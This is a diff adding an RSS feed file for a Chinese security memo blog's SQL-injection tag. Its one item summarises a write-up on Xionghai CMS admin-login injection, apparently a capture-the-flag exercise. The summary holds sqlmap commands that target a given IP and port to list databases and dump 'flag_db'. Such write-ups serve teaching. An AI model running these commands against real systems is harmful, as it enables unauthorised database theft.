@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>SQL注入 on 备忘录</title>
+    <link>https://xxxhidexxx.github.io/tags/sql%E6%B3%A8%E5%85%A5/</link>
+    <description>Recent content in SQL注入 on 备忘录</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>null</copyright>
+    <lastBuildDate>Mon, 12 Feb 2024 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://xxxhidexxx.github.io/tags/sql%E6%B3%A8%E5%85%A5/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>熊海 CMS 后台登录的 SQL 注入</title>
+      <link>https://xxxhidexxx.github.io/posts/sec/sqli4/</link>
+      <pubDate>Mon, 12 Feb 2024 00:00:00 +0000</pubDate>
+      <guid>https://xxxhidexxx.github.io/posts/sec/sqli4/</guid>
+      <description>手工注入 用 sqlmap 扫描 使用的 sqlmap 语句如下。&amp;ndash;forms 是对登录框的表单进行扫描，如果这个 forms 指令行不通，可以考虑抓包到 txt 用 -r 扫描。&#xA;sqlmap -u http://111.9.41.91:53008/admin/?r=index --forms --batch --dbs&#xD;&amp;ndash;dbs 的意思是列出所有数据库名称&#xA;sqlmap -u http://111.9.41.91:53008/admin/?r=index --forms --batch -D flag_db --dump&#xD;-D 是指定数据库，&amp;ndash;dump 是以文件形式导出。</description>
+    </item>
+  </channel>
+</rss>
